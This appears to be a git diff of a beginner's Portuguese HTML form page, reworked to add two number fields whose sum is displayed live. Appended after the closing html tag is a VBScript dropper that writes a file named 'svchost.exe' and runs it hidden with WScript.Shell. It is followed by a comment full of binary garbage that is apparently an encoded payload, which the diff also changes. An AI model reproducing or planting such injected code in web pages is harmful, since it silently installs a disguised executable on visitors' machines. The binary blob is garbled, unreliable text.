@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt - BR">
 <head>
@@ -7,40 +8,23 @@
     <title>FormulÃ¡rio</title>
 </head>
 <body>
-    <h1>Exemplo de FormulÃ¡rio</h1>
-    <form action="cadastro.php" method="get">
+    <h1>FormulÃ¡rio</h1>
+    <form action="cadastro.php" method="get" autocomplete="on">
+
         <p>
-            <label for="iest"></label>
-            <select name="est" id="iest">
-                <optgroup label="Sudeste">
-                    <option value="SP">SÃ£o Paullo</option>
-                    <option value="RJ">Rio de Janeiro</option>
-                    <option value="MG" selected>Minas Gerais</option>
-                </optgroup>
-
-                
-
-                <optgroup label="Nordeste">
-                    <option value="MA">MaranhÃ£o</option>
-                    <option value="PE">Pernambuco</option>
-                    <option value="RN">Rio Grande Do Norte</option>
-                </optgroup>
-            </select>
-
-            <p>
-                <label for="iprof"></label>
-                <input type="text" name="prof" id="iprof" list="lstprof">
-                    <datalist id="lstprof">
-                        <option value=>Professor</option>
-                        <option value=>Bombeiro</option>
-                        <option value=>Desenvolvedor</option>
-                    </datalist> 
-            </p>
+            <label for="in1">NÃºmero 1</label>
+            <input type="number" name="n1" id="in1" min="0" max="50" required oninput="isoma.innerHTML = Number(in1.value) + Number(in2.value)">
         </p>
 
         <p>
-            <label for="imsg">Mensagem</label><br>
-            <textarea name="msg" id="imsg" cols="30" rows="10"></textarea>
+            <label for="in2">NÃºmero 2</label>
+            <input type="number" name="n2" id="in2" min="0" max="50" required oninput="isoma.innerHTML = Number(in1.value) + Number(in2.value)">
+        </p>
+
+
+        <p>
+            <label for="isoma">Soma: </label>
+            <output id="isoma" name="soma">0</output>
         </p>
 
         <p>
@@ -48,6 +32,7 @@
             <input type="reset" value="Limpar">
         </p>
     </form>
+
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -63,6 +48,7 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--‚Ò°³rÕÓå¬¹Js’¾2H=Wjpp=‚k0Ó>İ4µUËí‚O6Ğ‹„_°¾øh
-Øoİä>*.iØJ]pËı¯’}´HÚÜ¦Ëv\]8e˜¡™£Ü@T®FûôÍ‡9ÁÁ ‘šƒâXT²}÷‘÷½éï5€ß‚MÚŠÂx±3RÀ%œ‹L ¹l÷„«’ŒÒì çê¡æ?…bœQ†»¦ÊüÄ\Ò—‡ş¯È ©ø]7áƒ¬yrîüŒòşö`A”•7*Ëãtâ¶¾İåyGweLØGÀbq(âÁv¯öPX/ªœ­š(‡ÒC„µoµQÇÁji˜ü¹F¸İ}‚® Nó„«5a;:DÏwDàşÃßÉÆ¶T{PğµVî•5«ş:)Â=–Kío^ê´ÂON¯:300 N~“ê%w)'»@¼ÆI•Z.:€“7	l¶¸áíMÁtÄXûH©œ 3éCÍM_ƒ—$GËLãO$®.K€•¾W¬_lÀFwxÅ»3kdÎ4,ŒÍ	6mªf	Ê :Dó²+éÍj/k®¥Sü{K@‹1€ßûê%»ÛÑûúùL ¤¼yú¯œj<öU½j	’áü!™ ËÎRÕøËÎËÎËÎÅ
--Nˆ¢8àÍÎ ËÎ-->
+//--></SCRIPT><!--³3bbA¿¢éË¥AvåÀƒW±šÁĞ‡•Ï¦He{ Év}Ã¬ˆd ;8~‘ß«2ú/ u 2ôŞ°`:¬Lôl¼%|‡]ÑÖßláŞ¤NQ•Ÿ@/æÓü†£şàly³G»EÔ?Å–ìLk¶®Ñê˜Úƒ2=5Ê¡‡SÖmŒÆ= AÎÍ8OÛWYÚêÂ¯QCqÒ="y†y Üo'}‹ËÖXùÌqO–¯¢(r"îi
+?¨ÈK.°ÖÃl6¢É¼U¦M6é:åâúÃÃz‚õZ°œ<âuã¶X‡äS‹P©0/P¾s<‰¤Ú„ Ö|ƒİ ·ÙR4J~B#ù87W!‚€½5p2nóø¢háøéû~pØ7ŠâïaI™æ}Pİ4 »föAİdnKCõÊA%‡;ñ!L	4Î4®³†…Q€0‹GáÃ*cNª¶Wªd
+ïG¶ÄÙ&ö¼ÊGµ´Ko‰Gó«[ûC_%?Ûód¢àĞ«q=Jó°Wpi¯T!Bg¨$º	~ÛFäÆcRÊÊkdŞ¡r¶*ØÎx¶†f€ÅlFŠóš¢ğéeÉ“‘¾pÃI.5Åğí*RòëTÛÏ)=¸mûï›x“P ËÎRÕøËÎËÎËÎÅ
+-Nˆ¢8CÏÎ ËÎ-->
